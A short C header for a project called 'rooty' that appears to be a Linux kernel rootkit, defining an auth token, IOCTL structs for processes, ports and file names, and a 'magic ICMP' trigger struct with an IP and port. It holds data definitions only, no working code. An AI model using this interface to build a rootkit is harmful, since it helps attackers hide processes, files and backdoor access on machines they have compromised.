#ifndef ROOTY_UAPI_H
#define ROOTY_UAPI_H

/*
 * Shared UAPI header for the rooty project.
 * Single source of truth for AUTH_TOKEN, IOCTL argument structs,
 * and the magic ICMP struct, used by both kernel and userspace code.
 */

#ifdef __KERNEL__
#include <linux/types.h>
#else
#include <sys/types.h>
#endif

#define AUTH_TOKEN 0xDEADC0DE

struct rooty_args {
    unsigned short cmd;
    void *ptr;
};

struct rooty_proc_args {
    pid_t pid;
};

struct rooty_port_args {
    unsigned short port;
};

struct rooty_file_args {
    char *name;
    unsigned short namelen;
};

struct magic_icmp {
    unsigned int magic;
    unsigned int ip;
    unsigned short port;
};

#endif /* ROOTY_UAPI_H */
